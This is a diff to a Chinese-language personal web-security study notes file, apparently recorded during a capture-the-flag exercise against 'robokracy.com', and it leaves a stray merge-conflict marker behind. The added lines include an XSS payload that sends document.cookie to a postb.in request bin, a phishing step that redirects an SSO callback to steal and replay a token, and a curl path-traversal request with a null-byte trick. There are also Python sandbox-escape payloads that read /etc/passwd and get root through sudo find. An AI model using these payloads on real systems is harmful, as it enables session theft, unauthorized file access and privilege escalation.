@@ -1710,9 +1710,13 @@ date: 2019-05-13 14:42:09
     - 攻击+工具
       - [csrf 攻击](https://www.cnblogs.com/hyddd/archive/2009/04/09/1432744.html)
       - xss
+<<<<<<< HEAD
         - phishing 偷 cookie
           - [Phishing 查询被调参数神站](https://postb.in/)
-        - phishing 偷 token
+          - `<a id='a'>click</a><script>document.getElementById('a').href ='https://postb.in/1600766899166-1163333267904?a='+document.cookie;</script>`
+        - phishing 偷 token`https://sso.robokracy.com/?callback=http://robokracy.com:18443/sso_callback.php`
+          - 发邮件，链接：`https://sso.robokracy.com/?callback=https://postb.in/1600761951600-5221114358864`
+          - 偷完以后访问`http://robokracy.com:18443/sso_callback.php?session={"token"%3a"369214b0-1fe0-12ea-8254-2dea268906e6"}`
         - example
           - `<script>alert(1)</script>`
           - `<img src=x onerror='alert(1)'>`
@@ -1730,7 +1734,25 @@ date: 2019-05-13 14:42:09
         - example
           - https://google-gruyere.appspot.com/542456601471262836313354380787402066011/a/..%2f..%2fsecret.txt
             - %2f is /
-
+        - curl
+          ```sh
+          curl 'http://robokracy.com:18443/ajax/image_download.php' \
+            -H 'Proxy-Connection: keep-alive' \
+            -H 'Pragma: no-cache' \
+            -H 'Cache-Control: no-cache' \
+            -H 'Accept: */*' \
+            -H 'X-Requested-With: XMLHttpRequest' \
+            -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' \
+            -H 'Origin: http://robokracy.com:18443' \
+            -H 'Referer: http://robokracy.com:18443/documents.php' \
+            -H 'Accept-Language: en,de-DE;q=0.9,de;q=0.8' \
+            -H 'Cookie: PHPSESSID=odi7mrukqcria3he3v362p1nbu' \
+            --data-raw 'filename=..%252Fusers%252FTerrorist%252Forders%252F179-C4Lg7he9ao1jfR0ZYeredA%253D%253D.pdf%252500' \
+            --compressed \
+            --insecure --output 1.pdf
+          ```
+          - `00`表示结束，忽略后面拼的".jpg"
+          - `%25`即`%`
       - DoS
       - DNS spoofing
         - [subdomain scan](https://subdomainfinder.c99.nl/index.php)
@@ -1739,6 +1761,14 @@ date: 2019-05-13 14:42:09
           - 可以用来做Single User Performance Test
       - Parameter tampering
         - 直接在POST payload里或者GET ?后加可能的parameter
+        - `<html><body><a href="ajax/validate_order.php?order_id=434">click</a></body></html>`
+      - python 沙箱逃逸
+        - `().__class__.__bases__[0].__subclasses__()[40](r'/etc/passwd').read()`读取任意文件
+        - `().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals['linecache'].__dict__.values()[12].system('ls -la')` 执行任意命令
+        - `().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals['linecache'].__dict__.values()[12].system('sudo find . -name "flash*" -exec /bin/bash ')` 利用find命令漏洞获取root权限
+        - `cat flash_firmware`得到网站和密码信息
+    - tools
+      - [subdomain scan](https://subdomainfinder.c99.nl/index.php)
       - 抓包工具
         - [wireshark](https://www.wireshark.org/download.html)
           - [从http数据包获取用户登陆信息](https://blog.csdn.net/wangqingchuan92/article/details/81095871)
@@ -1746,6 +1776,7 @@ date: 2019-05-13 14:42:09
       - Git 项目还原
         - [Git Hack](https://github.com/lijiejie/GitHack)
           - `python GitHack.py https://robokracy.com/.git `
+      - [xss平台](https://xss8.cc/xss.php)
   - C语言
     - buffer overflow
       - 命令行输入0x0：Ctrl+Shift+2
